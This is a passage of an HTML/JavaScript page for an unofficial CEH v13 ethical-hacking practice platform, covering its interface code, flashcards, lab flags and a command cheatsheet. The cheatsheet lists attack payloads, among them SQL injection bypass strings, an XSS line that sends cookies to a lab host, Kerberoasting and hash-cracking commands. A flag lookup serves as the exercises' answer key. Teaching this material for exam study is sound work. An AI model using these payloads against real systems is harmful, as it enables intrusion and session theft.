@@ -1,0 +1,3126 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CEH v13 Practical Lab Learning Platform | Certified Ethical Hacker</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            charcoal: {
+              950: '#06090e',
+              900: '#0a0e17',
+              850: '#0f1422',
+              800: '#151b2e',
+              750: '#1c243c',
+              700: '#25304e',
+              600: '#38476f',
+              500: '#526494'
+            },
+            cyber: {
+              emerald: '#10b981',
+              cyan: '#06b6d4',
+              amber: '#f59e0b',
+              purple: '#8b5cf6',
+              rose: '#f43f5e'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    body {
+      background-color: #06090e;
+      color: #e2e8f0;
+      font-family: 'Inter', sans-serif;
+    }
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0a0e17;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1c243c;
+      border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #06b6d4;
+    }
+    .glow-cyan {
+      box-shadow: 0 0 15px rgba(6, 182, 212, 0.25);
+    }
+    .glow-emerald {
+      box-shadow: 0 0 15px rgba(16, 185, 129, 0.25);
+    }
+    .glow-purple {
+      box-shadow: 0 0 15px rgba(139, 92, 246, 0.25);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col bg-charcoal-950 text-slate-100 antialiased selection:bg-cyber-cyan selection:text-black">
+
+  <!-- Toast Notification Container -->
+  <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+  <!-- Top Legal & Educational Disclaimer Banner -->
+  <aside aria-label="Official Disclaimer" class="bg-charcoal-900 border-b border-charcoal-800 text-[11px] font-mono text-slate-400 py-1.5 px-4 flex flex-wrap items-center justify-between gap-2">
+    <div class="flex items-center gap-2">
+      <span class="inline-block w-2 h-2 rounded-full bg-cyber-emerald animate-pulse"></span>
+      <span class="text-slate-200 font-bold uppercase tracking-wider">Educational Lab Enclave:</span>
+      <span>Original educational exercises designed for Certified Ethical Hacker (CEH v13) practical exam preparation.</span>
+    </div>
+    <div class="flex items-center gap-4 text-slate-400">
+      <span>Not affiliated with EC-Council</span>
+      <span class="text-charcoal-700">|</span>
+      <a href="index.html" class="text-cyber-cyan hover:underline flex items-center gap-1 font-bold">
+        <span>⚡ Switch to HackRange Cyber Range</span>
+      </a>
+    </div>
+  </aside>
+
+  <!-- Main Navigation Header -->
+  <header class="bg-charcoal-900/90 backdrop-blur border-b border-charcoal-800 sticky top-0 z-40">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
+      
+      <!-- Brand & Title -->
+      <div class="flex items-center gap-3">
+        <button onclick="toggleSidebar()" class="lg:hidden p-2 rounded-lg bg-charcoal-800 text-slate-300 hover:text-white">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
+        </button>
+        <div class="flex items-center gap-2.5 cursor-pointer" onclick="navigate('dashboard')">
+          <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-cyber-cyan to-cyber-emerald flex items-center justify-center font-bold text-black font-mono shadow glow-cyan">
+            13
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="font-mono font-bold text-white text-base tracking-tight">CEH v13</span>
+              <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30">Practical Lab Platform</span>
+            </div>
+            <p class="text-[10px] font-mono text-slate-400 hidden sm:block">Hands-on Ethical Hacking Curriculum &amp; AD CS Auditing</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Navigation Tabs -->
+      <nav class="hidden md:flex items-center gap-1 text-xs font-mono">
+        <button onclick="navigate('dashboard')" id="nav-btn-dashboard" class="px-3 py-2 rounded-lg transition font-bold text-white bg-charcoal-800">
+          Dashboard
+        </button>
+        <button onclick="navigate('modules')" id="nav-btn-modules" class="px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800">
+          20 Modules
+        </button>
+        <button onclick="navigate('lab', 'lab-adcs')" id="nav-btn-adcs" class="px-3 py-2 rounded-lg transition text-purple-300 hover:text-white hover:bg-charcoal-800 flex items-center gap-1">
+          <span class="text-xs">👑</span>
+          <span>AD CS Master Lab</span>
+        </button>
+        <button onclick="navigate('cheatsheets')" id="nav-btn-cheatsheets" class="px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800 flex items-center gap-1">
+          <span>📖</span>
+          <span>Vault</span>
+        </button>
+        <button onclick="navigate('flashcards')" id="nav-btn-flashcards" class="px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800 flex items-center gap-1">
+          <span>🗂️</span>
+          <span>Drills</span>
+        </button>
+        <button onclick="navigate('terminal')" id="nav-btn-terminal" class="px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800 flex items-center gap-1">
+          <span>&gt;_</span>
+          <span>Terminal Simulator</span>
+        </button>
+        <button onclick="navigate('exam')" id="nav-btn-exam" class="px-3 py-2 rounded-lg transition text-amber-300 hover:text-white hover:bg-charcoal-800 flex items-center gap-1">
+          <span>🏆</span>
+          <span>Mock Exam</span>
+        </button>
+        <button onclick="navigate('report')" id="nav-btn-report" class="px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800">
+          Lab Report
+        </button>
+      </nav>
+
+      <!-- Right Action Tools: Backend Status & Audio Toggle -->
+      <div class="flex items-center gap-3">
+        <div id="backend-status-pill" class="flex items-center gap-1.5 px-2.5 py-1 rounded bg-charcoal-800/80 border border-charcoal-700 text-[11px] font-mono">
+          <span id="backend-status-dot" class="w-2 h-2 rounded-full bg-amber-400"></span>
+          <span id="backend-status-text" class="text-slate-300">Sync: LocalStorage</span>
+        </div>
+        <button onclick="toggleAudio()" id="audio-toggle-btn" class="px-2.5 py-1 rounded bg-charcoal-800 hover:bg-charcoal-700 border border-charcoal-700 text-slate-300 text-xs font-mono transition" title="Toggle Sound Synthesis">
+          🔊 Sound: ON
+        </button>
+      </div>
+
+    </div>
+  </header>
+
+  <!-- Main Platform Body with Sidebar -->
+  <div class="flex-1 flex max-w-7xl w-full mx-auto">
+    
+    <!-- Collapsible Sidebar -->
+    <aside id="platform-sidebar" class="w-72 bg-charcoal-900 border-r border-charcoal-800 flex-shrink-0 flex flex-col justify-between hidden lg:flex">
+      
+      <!-- Upper Section: Search & Module List -->
+      <div class="p-4 space-y-4 overflow-y-auto max-h-[calc(100vh-8rem)]">
+        
+        <!-- Search Filter -->
+        <div class="relative">
+          <input id="sidebar-search" type="text" oninput="handleSidebarSearch(event)" placeholder="Search 20 modules &amp; labs..." class="w-full px-3 py-2 bg-charcoal-850 border border-charcoal-700 rounded-lg text-xs font-mono text-white placeholder-slate-500 focus:outline-none focus:border-cyber-cyan transition">
+          <span class="absolute right-2.5 top-2.5 text-xs text-slate-500">🔍</span>
+        </div>
+
+        <!-- Curriculum Directory -->
+        <div>
+          <div class="flex items-center justify-between text-[11px] font-mono font-bold text-slate-400 uppercase tracking-wider px-2 mb-2">
+            <span>CEH v13 Curriculum</span>
+            <span id="sidebar-completed-count" class="text-cyber-cyan">0/21</span>
+          </div>
+
+          <div id="sidebar-module-list" class="space-y-1">
+            <!-- Dynamically populated module links -->
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Bottom Sidebar Footer: Quick Reset & Session -->
+      <div class="p-4 border-t border-charcoal-800 bg-charcoal-950/40 text-xs font-mono flex items-center justify-between">
+        <button onclick="resetPlatformProgress()" class="text-rose-400 hover:underline text-[11px] flex items-center gap-1">
+          <span>🔄</span>
+          <span>Reset Progress</span>
+        </button>
+        <span class="text-slate-500 text-[10px]">v13.4 Enclave</span>
+      </div>
+
+    </aside>
+
+    <!-- Main View Dynamic Container -->
+    <main id="main-content" class="flex-1 p-4 sm:p-6 lg:p-8 overflow-y-auto min-w-0">
+      <!-- Dynamically injected views: dashboard, lab, modules, terminal, report -->
+    </main>
+
+  </div>
+
+  <!-- Terminal Quick Slide-up Drawer Modal (Global Hotkey: Ctrl+` or click) -->
+  <div id="terminal-drawer" class="fixed inset-x-0 bottom-0 z-50 bg-charcoal-950 border-t-2 border-cyber-cyan shadow-2xl transition-transform duration-300 translate-y-full max-h-[80vh] flex flex-col">
+    <div class="bg-charcoal-900 px-4 py-2 flex items-center justify-between border-b border-charcoal-800 font-mono text-xs">
+      <div class="flex items-center gap-2">
+        <span class="w-2.5 h-2.5 rounded-full bg-cyber-emerald animate-pulse"></span>
+        <span class="font-bold text-white">CEH v13 Educational Terminal Simulator</span>
+        <span class="text-slate-500 text-[11px]">[Authorized Subnet 10.10.20.0/24]</span>
+      </div>
+      <div class="flex items-center gap-2">
+        <button onclick="clearTerminal()" class="px-2 py-0.5 rounded bg-charcoal-800 hover:bg-charcoal-700 text-slate-400 hover:text-white text-[11px]">Clear</button>
+        <button onclick="toggleTerminalDrawer(false)" class="text-slate-400 hover:text-white px-2 py-0.5 text-sm font-bold">✕</button>
+      </div>
+    </div>
+    <div id="drawer-terminal-body" class="p-4 bg-charcoal-950 font-mono text-xs overflow-y-auto flex-1 space-y-2 text-slate-300">
+      <!-- Terminal output lines -->
+    </div>
+    <div class="p-3 bg-charcoal-900 border-t border-charcoal-800 flex items-center gap-2">
+      <span class="text-cyber-emerald font-mono font-bold text-xs">cadet@ceh-node:~$</span>
+      <input id="drawer-terminal-input" type="text" onkeydown="handleTerminalKey(event)" placeholder="Type a supported command (e.g. nmap, ss, uname, dig, iptables, openssl, help)..." class="flex-1 bg-transparent font-mono text-xs text-white focus:outline-none placeholder-slate-600">
+      <button onclick="submitTerminalCommand()" class="px-3 py-1 rounded bg-cyber-cyan hover:bg-cyan-400 text-black font-mono font-bold text-xs transition">
+        Execute
+      </button>
+    </div>
+  </div>
+
+  <!-- Floating Terminal Launcher Trigger -->
+  <button onclick="toggleTerminalDrawer(true)" class="fixed bottom-5 right-5 z-30 px-3.5 py-2.5 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-cyber-cyan/50 text-white font-mono font-bold text-xs shadow-lg glow-cyan flex items-center gap-2 transition transform hover:scale-105">
+    <span class="text-cyber-cyan">&gt;_</span>
+    <span>Simulated Terminal</span>
+  </button>
+
+  <!-- Core Embedded Datasets (Ensures 100% Zero-Dependency Standalone Execution) -->
+  <script src="ceh_data/modules.js" onerror="console.log('Loading fallback inline data...')"></script>
+
+  <script>
+    // --- Web Audio API Procedural Sound Engine ---
+    const AudioEngine = {
+      ctx: null,
+      enabled: true,
+      init() {
+        if (!this.ctx) {
+          const AudioContext = window.AudioContext || window.webkitAudioContext;
+          if (AudioContext) this.ctx = new AudioContext();
+        }
+      },
+      click() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(800, this.ctx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.04);
+        gain.gain.setValueAtTime(0.08, this.ctx.currentTime);
+        gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.04);
+        osc.connect(gain);
+        gain.connect(this.ctx.destination);
+        osc.start();
+        osc.stop(this.ctx.currentTime + 0.04);
+      },
+      success() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        const now = this.ctx.currentTime;
+        const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6 arpeggio
+        notes.forEach((freq, idx) => {
+          const osc = this.ctx.createOscillator();
+          const gain = this.ctx.createGain();
+          osc.type = 'triangle';
+          osc.frequency.setValueAtTime(freq, now + idx * 0.08);
+          gain.gain.setValueAtTime(0.12, now + idx * 0.08);
+          gain.gain.linearRampToValueAtTime(0.001, now + idx * 0.08 + 0.2);
+          osc.connect(gain);
+          gain.connect(this.ctx.destination);
+          osc.start(now + idx * 0.08);
+          osc.stop(now + idx * 0.08 + 0.2);
+        });
+      },
+      alert() {
+        if (!this.enabled) return;
+        this.init();
+        if (!this.ctx) return;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(300, this.ctx.currentTime);
+        osc.frequency.linearRampToValueAtTime(150, this.ctx.currentTime + 0.15);
+        gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
+        gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.15);
+        osc.connect(gain);
+        gain.connect(this.ctx.destination);
+        osc.start();
+        osc.stop(this.ctx.currentTime + 0.15);
+      }
+    };
+
+    function toggleAudio() {
+      AudioEngine.enabled = !AudioEngine.enabled;
+      const btn = document.getElementById('audio-toggle-btn');
+      if (btn) btn.textContent = AudioEngine.enabled ? '🔊 Sound: ON' : '🔇 Sound: MUTED';
+      showToast(AudioEngine.enabled ? 'Audio effects enabled.' : 'Audio effects muted.', 'info');
+    }
+
+    // --- State Management ---
+    const CEHState = {
+      modules: [],
+      labs: [],
+      quizzes: [],
+      activeView: 'dashboard', // 'dashboard', 'modules', 'lab', 'terminal', 'exam', 'cheatsheets', 'flashcards', 'report'
+      activeLabId: 'lab-01',
+      activeModuleFilter: 'All',
+      activeDifficultyFilter: 'All',
+      searchQuery: '',
+      sidebarSearch: '',
+      progress: {}, // labId -> { completedSteps: [], completedChecklist: [], isCompleted: bool }
+      notes: {}, // labId -> string
+      bookmarks: [], // array of labIds
+      quizScores: {}, // moduleId -> { score, total, passed }
+      flags: {}, // labId -> verified flag string
+      flashcards: {}, // cardId -> 'mastered' | 'review'
+      activeCardIndex: 0,
+      cardFlipped: false,
+      cheatsheetSearch: '',
+      cheatsheetCategory: 'all',
+      flashcardCategory: 'all',
+      terminalLines: [
+        { type: 'accent', text: '[*] CEH v13 Practical Educational Terminal Simulator Initialized.' },
+        { type: 'info', text: '[*] Authorized scope: 10.10.20.0/24. Type "help" for supported commands.' }
+      ],
+      terminalHistory: [],
+      terminalHistoryIdx: -1,
+      isBackendOnline: false,
+      examTimerSec: 21600,
+      examTimerActive: false,
+      examTimerInterval: null,
+      examAnswers: {},
+      examVerified: {}
+    };
+
+    // --- CEH v13 Cheatsheet & High-Yield Command Vault ---
+    const CHEATSHEET_ENTRIES = [
+      { category: "Recon & Scanning", title: "Nmap TCP SYN Stealth Scan", command: "nmap -sS -Pn -T4 -p- 10.10.20.10", explanation: "Sends TCP SYN packets without completing the 3-way handshake (half-open scan). Faster and stealthier than connect scan.", tip: "CEH Exam Tip: SYN scan (-sS) requires root/Administrator privileges because it constructs raw packets." },
+      { category: "Recon & Scanning", title: "Nmap TCP Connect Scan", command: "nmap -sT -p 1-1024 10.10.20.10", explanation: "Completes the full 3-way handshake (SYN, SYN-ACK, ACK) via the OS socket API.", tip: "Used by unprivileged users when raw packet crafting is not permitted." },
+      { category: "Recon & Scanning", title: "Nmap UDP Scan", command: "nmap -sU -p 53,67,69,161 10.10.20.10", explanation: "Audits stateless UDP ports. ICMP port unreachable error indicates closed port; no response indicates open|filtered.", tip: "Slow scan speed due to host ICMP rate limiting (RFC 1812)." },
+      { category: "Recon & Scanning", title: "Nmap Xmas Tree Scan", command: "nmap -sX -p 21,80 10.10.20.10", explanation: "Sets FIN, PSH, and URG flags (lights up like a Christmas tree). RFC 793 states closed ports reply with RST; open ports drop packets.", tip: "Fails against Windows machines because Windows replies with RST to all RFC-violating frames." },
+      { category: "Recon & Scanning", title: "Nmap Idle / Zombie Scan", command: "nmap -sI 10.10.20.5:80 10.10.20.10", explanation: "Blind port scan spoofing a quiet zombie host and monitoring its IP Identification (IPID) increments.", tip: "Zombie must have predictable, incremental IPID sequences and zero background traffic." },
+      { category: "Recon & Scanning", title: "DNS Zone Transfer (AXFR)", command: "dig @10.10.20.2 corp.enclave AXFR", explanation: "Requests full zone database replication from authoritative name server on TCP port 53.", tip: "DNS queries use UDP 53; Zone Transfers use TCP 53." },
+      { category: "Exam Ports Matrix", title: "Kerberos Authentication", command: "nc -zv 10.10.20.2 88", explanation: "Port 88 (TCP/UDP) handles Ticket Granting Service (TGS) and AS-REQ/AS-REP requests in Windows Active Directory.", tip: "Vulnerable to Kerberoasting, AS-REP Roasting, and Golden Ticket forgery." },
+      { category: "Exam Ports Matrix", title: "RPC Endpoint Mapper", command: "rpcclient -U '' -N 10.10.20.50", explanation: "Port 135 (TCP) resolves RPC interface UUIDs to transport endpoints. Used to query Windows services and security tokens.", tip: "Frequently probed for unauthenticated IPC$ null sessions." },
+      { category: "Exam Ports Matrix", title: "SNMP Management Query", command: "snmpwalk -v2c -c public 10.10.20.1 1.3.6.1", explanation: "Port 161 (UDP) for SNMP queries, Port 162 for Traps. Uses community strings (e.g. 'public', 'private') as cleartext passwords.", tip: "SNMPv1/v2c send community strings in cleartext; SNMPv3 introduces SHA/AES encryption and user authentication." },
+      { category: "Exam Ports Matrix", title: "Server Message Block (SMB)", command: "smbclient -L //10.10.20.50 -N", explanation: "Port 445 (TCP) runs SMB natively over IP. Port 139 runs SMB over NetBIOS Session Service.", tip: "Targeted by EternalBlue (MS17-010), PsExec lateral movement, and SMB Relay attacks." },
+      { category: "Exam Ports Matrix", title: "Remote Desktop Protocol (RDP)", command: "xfreerdp /u:cadet /p:P@ss /v:10.10.20.10", explanation: "Port 3389 (TCP/UDP) provides graphical remote desktop management for Windows hosts.", tip: "Subject to BlueKeep (CVE-2019-0708 pre-auth RCE in RDP channel) and credential brute-forcing." },
+      { category: "Active Directory", title: "AD CS ESC1 Vulnerability Audit", command: "Get-ADObject -Filter 'objectClass -eq \"pKICertificateTemplate\"' -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=enclave' -Properties msPKI-Certificate-Name-Flag", explanation: "Audits templates where CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001) is active and Client Authentication EKU is present.", tip: "ESC1 allows low-privileged users to request certificates with arbitrary SAN (e.g., Domain Administrator)." },
+      { category: "Active Directory", title: "Kerberoasting SPN Request", command: "GetUserSPNs.py corp.enclave/cadet:Password -request -dc-ip 10.10.20.2", explanation: "Requests TGS-REP Kerberos tickets for accounts with Service Principal Names, extracted offline to crack plaintext passwords.", tip: "Service accounts frequently have weak passwords and never-expiring credentials." },
+      { category: "Active Directory", title: "BloodHound Ingestor Extraction", command: "SharpHound.exe -c All --zipfilename domain_graph.zip", explanation: "Collects group memberships, local admin rights, ACLs, and trust relationships to compute graph attack paths to Domain Admin.", tip: "Shortest path to Domain Admin visualization based on transitive object takeover." },
+      { category: "Sniffing & Filters", title: "tcpdump TCP SYN Packet Capture", command: "tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'", explanation: "Filters strictly for initial SYN connection requests across the monitored interface.", tip: "BPF byte-offset filtering inspects byte 13 of the TCP header where flags reside." },
+      { category: "Sniffing & Filters", title: "Cleartext Authentication Sniffing", command: "tcpdump -i eth0 -A 'port 21 or port 80 or port 110'", explanation: "Dumps raw ASCII payloads (-A) across unencrypted application protocols to harvest credentials in transit.", tip: "Detects FTP USER/PASS, HTTP Authorization/Cookie headers, and POP3 logins." },
+      { category: "Sniffing & Filters", title: "Wireshark Display Filter: HTTP POSTs", command: "http.request.method == \"POST\"", explanation: "Display filter isolating form submissions, logins, and API payload dispatches.", tip: "Combine with 'http contains password' to isolate credential submissions." },
+      { category: "Password & Crypto", title: "Hashcat NTLM Mode", command: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt", explanation: "Cracks Windows NTLM password hashes (mode 1000) using dictionary attack (-a 0).", tip: "NTLM is MD4(UTF-16LE(password)) with NO salt, allowing precomputed rainbow table lookups." },
+      { category: "Password & Crypto", title: "Hashcat Kerberos TGS-REP (Kerberoast)", command: "hashcat -m 13100 -a 0 tgs_ticket.txt rockyou.txt", explanation: "Cracks Kerberos 5 TGS-REP tickets encrypted with RC4-HMAC (type 23).", tip: "Fast cracking speed compared to modern salted password hashes." },
+      { category: "Password & Crypto", title: "OpenSSL AES-256-CBC Decryption", command: "openssl enc -d -aes-256-cbc -pbkdf2 -in secret.enc -out secret.txt", explanation: "Decrypts file using 256-bit AES in Cipher Block Chaining mode with PBKDF2 key derivation.", tip: "Always enforce PBKDF2 or Argon2 for iterative key stretching against brute-force attacks." },
+      { category: "Web Security", title: "SQLi Authentication Bypass", command: "admin' OR 1=1--", explanation: "Classic SQL injection payload forcing the WHERE clause to evaluate to TRUE, bypassing password checks.", tip: "Remediate with parameterized queries and prepared statements (bind variables)." },
+      { category: "Web Security", title: "SQLi Union-Based Column Enumeration", command: "' UNION SELECT null, username, password FROM users--", explanation: "Appends the results of an attacker-crafted SELECT statement to the original database query result.", tip: "Both queries in a UNION statement must return the exact same number of columns with compatible data types." },
+      { category: "Web Security", title: "XSS Cookie Theft Payload", command: "<script>fetch('http://10.10.20.10/log?c='+encodeURIComponent(document.cookie))<\\/script>", explanation: "Executes client-side JavaScript in the victim's browser context to exfiltrate session tokens.", tip: "Mitigate using the HttpOnly cookie flag and strict Content-Security-Policy (CSP)." }
+    ];
+
+    // --- CEH v13 Flashcard Drill Data ---
+    const FLASHCARDS_DATA = [
+      { id: "fc-01", category: "Laws & Standards", question: "What US federal statute criminalizes unauthorized access to protected computer systems?", answer: "Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030", examTip: "Makes it a felony to access protected systems without authorization or exceed authorized access." },
+      { id: "fc-02", category: "Recon & Scanning", question: "Which Nmap scan flag conducts a TCP FIN scan, and what is its expected behavior against Windows targets?", answer: "Flag: -sF. RFC 793 states closed ports reply with RST; open ports drop the packet. However, Windows sends RST to all non-standard packets regardless of port state.", examTip: "FIN, Xmas (-sX), and Null (-sN) scans do not work against Microsoft Windows." },
+      { id: "fc-03", category: "Network Attacks", question: "What is the difference between a Smurf attack and a Fraggle attack?", answer: "Smurf uses ICMP Echo requests sent to a broadcast address with spoofed victim IP. Fraggle uses UDP packets (typically port 7 Echo or port 19 Chargen) sent to a broadcast address.", examTip: "Remember: S = Smurf = ICMP; F = Fraggle = UDP." },
+      { id: "fc-04", category: "Active Directory", question: "What Active Directory Certificate Services (AD CS) misconfiguration is known as ESC1?", answer: "A certificate template that enables 'Enrollee Supplies Subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT), includes a Client Authentication EKU, and grants enrollment rights to low-privileged users.", examTip: "Enables unprivileged users to request a certificate as Domain Administrator for instant domain compromise." },
+      { id: "fc-05", category: "Cryptography", question: "What is the key difference between Diffie-Hellman and RSA?", answer: "Diffie-Hellman is a key-exchange protocol for establishing a shared secret over an insecure channel (does NOT provide encryption/signing directly). RSA is an asymmetric cryptosystem that provides encryption and digital signatures.", examTip: "Diffie-Hellman = Key Exchange; RSA = Encryption & Signatures." },
+      { id: "fc-06", category: "Web Security", question: "What HTTP response header prevents a web page from being embedded in <iframe> elements to stop Clickjacking?", answer: "X-Frame-Options: DENY (or SAMEORIGIN), or Content-Security-Policy: frame-ancestors 'none'.", examTip: "Clickjacking is UI redressing where transparent iframes trick users into clicking buttons." },
+      { id: "fc-07", category: "Wireless Security", question: "What key exchange mechanism in WPA3 replaces the vulnerable 4-way PSK handshake of WPA2?", answer: "Simultaneous Authentication of Equals (SAE), based on the Dragonfly key exchange protocol.", examTip: "Provides forward secrecy and renders offline dictionary brute-force attacks ineffective." },
+      { id: "fc-08", category: "Malware & System", question: "What is an EICAR test string, and what is its purpose?", answer: "A standard 68-character benign ASCII text file designed to test that antivirus software is functioning without releasing live malware.", examTip: "Has a standard known SHA-256 hash and triggers detection on all compliant AV scanners." },
+      { id: "fc-09", category: "Network Protocols", question: "Which port does Kerberos use, and what is the difference between an AS-REP Roasting and Kerberoasting attack?", answer: "Port 88. AS-REP Roasting targets accounts with 'Do not require Kerberos preauthentication'. Kerberoasting targets service accounts with a Service Principal Name (SPN).", examTip: "AS-REP Roasting does not require any credentials; Kerberoasting requires an authenticated domain account." },
+      { id: "fc-10", category: "Vulnerability Mgmt", question: "In CVSS v3.1, what are the three metric groups, and what is the maximum possible score?", answer: "Base, Temporal, and Environmental metrics. The maximum score is 10.0 (Critical: 9.0 - 10.0).", examTip: "Base score represents intrinsic qualities unchanged over time or user environment." }
+    ];
+
+    // --- Lab Proof Flags & Hints ---
+    const LAB_FLAGS_LOOKUP = {
+      "lab-01": { flag: "FLAG{baseline_env_recorded}", hint: "Execute Step 3's baseline audit command to reveal this flag in baseline_env.txt." },
+      "lab-02": { flag: "FLAG{dns_axfr_zone_transferred}", hint: "Execute Step 3's dig AXFR zone transfer command against 10.10.20.2." },
+      "lab-03": { flag: "FLAG{nmap_syn_stealth_ports_identified}", hint: "Execute Step 2's nmap -sS -sV scan revealing open ports 21, 80, 445." },
+      "lab-04": { flag: "FLAG{smb_null_session_shares_enumerated}", hint: "Execute Step 2's smbclient -L command listing shares on 10.10.20.50." },
+      "lab-05": { flag: "FLAG{cve_2011_2523_vsftpd_backdoor}", hint: "Execute Step 1's vulnerability search correlating vsftpd 2.3.4 to its CVE." },
+      "lab-06": { flag: "FLAG{suid_root_privilege_escalation}", hint: "Execute Step 2's find / -perm -4000 command identifying SUID binaries." },
+      "lab-07": { flag: "FLAG{eicar_sha256_hash_verified}", hint: "Execute Step 1's sha256sum verification of the sample file." },
+      "lab-08": { flag: "FLAG{tcpdump_cleartext_auth_captured}", hint: "Execute Step 2's tcpdump command capturing cleartext credentials in transit." },
+      "lab-09": { flag: "FLAG{spf_dmarc_spoofing_detected}", hint: "Execute Step 2's mail header parsing command uncovering the spoofed sender." },
+      "lab-10": { flag: "FLAG{syn_recv_socket_rate_limited}", hint: "Execute Step 2's netstat/ss socket monitoring during baseline traffic." },
+      "lab-11": { flag: "FLAG{samesite_httponly_cookie_secured}", hint: "Execute Step 1's curl header audit checking Set-Cookie security flags." },
+      "lab-12": { flag: "FLAG{suricata_drop_rule_enforced}", hint: "Execute Step 2's iptables firewall rule listing drop directives." },
+      "lab-13": { flag: "FLAG{servertokens_prod_header_hardened}", hint: "Execute Step 1's curl -I command verifying the hardened server header." },
+      "lab-14": { flag: "FLAG{idor_api_broken_object_level_auth}", hint: "Execute Step 1's curl API call demonstrating the IDOR parameter tampering." },
+      "lab-15": { flag: "FLAG{sql_injection_bypass_parameterized}", hint: "Execute Step 2's parameterized SQL query eliminating dynamic concatenation." },
+      "lab-16": { flag: "FLAG{wpa3_sae_simultaneous_auth_equals}", hint: "Execute Step 2's wireless configuration audit distinguishing WPA2 from WPA3." },
+      "lab-17": { flag: "FLAG{android_allowbackup_debuggable_audited}", hint: "Execute Step 2's aapt dump badging command inspecting AndroidManifest.xml." },
+      "lab-18": { flag: "FLAG{mqtt_tls_insecure_default_disabled}", hint: "Execute Step 2's IoT device port audit confirming port 1883 disablement." },
+      "lab-19": { flag: "FLAG{s3_public_access_block_enforced}", hint: "Execute Step 2's AWS CLI S3 public access block audit command." },
+      "lab-20": { flag: "FLAG{aes256_cbc_pbkdf2_decrypted}", hint: "Execute Step 2's openssl enc -d -aes-256-cbc decryption command." },
+      "lab-adcs": { flag: "FLAG{esc1_san_administrator_domain_escalation}", hint: "Execute Step 2's PowerShell Get-ADObject query identifying the vulnerable template." }
+    };
+
+    // --- Authorized Enclave 10.10.20.0/24 Subnet Hosts ---
+    const SUBNET_HOSTS = [
+      {
+        ip: "10.10.20.1",
+        name: "Enclave Gateway",
+        role: "VyOS Stateful Firewall & Router",
+        ports: "22 (SSH), 53 (DNS Proxy), 67 (DHCP)",
+        os: "VyOS / Linux 5.10",
+        status: "ONLINE",
+        color: "emerald",
+        relatedLab: "lab-01",
+        scanCmd: "nmap -sS -p 22,53 10.10.20.1"
+      },
+      {
+        ip: "10.10.20.2",
+        name: "DC01.corp.enclave",
+        role: "Enterprise Active Directory & AD CS",
+        ports: "88 (Kerberos), 135 (RPC), 389 (LDAP), 443 (/certsrv/), 445 (SMB)",
+        os: "Windows Server 2022 Datacenter",
+        status: "HIGH-VALUE",
+        color: "purple",
+        relatedLab: "lab-adcs",
+        scanCmd: "nmap -sS -sV -p 88,135,389,445 10.10.20.2"
+      },
+      {
+        ip: "10.10.20.10",
+        name: "Cadet Workstation",
+        role: "Authorized Pentesting Node (Kali/Ubuntu)",
+        ports: "22 (SSH), 49152+ (Dynamic Outbound)",
+        os: "Ubuntu 22.04 LTS (Kernel 5.15)",
+        status: "LOCAL SINK",
+        color: "cyan",
+        relatedLab: "lab-01",
+        scanCmd: "ip -br addr show"
+      },
+      {
+        ip: "10.10.20.50",
+        name: "CORP-APP01",
+        role: "Production Web & Database Server",
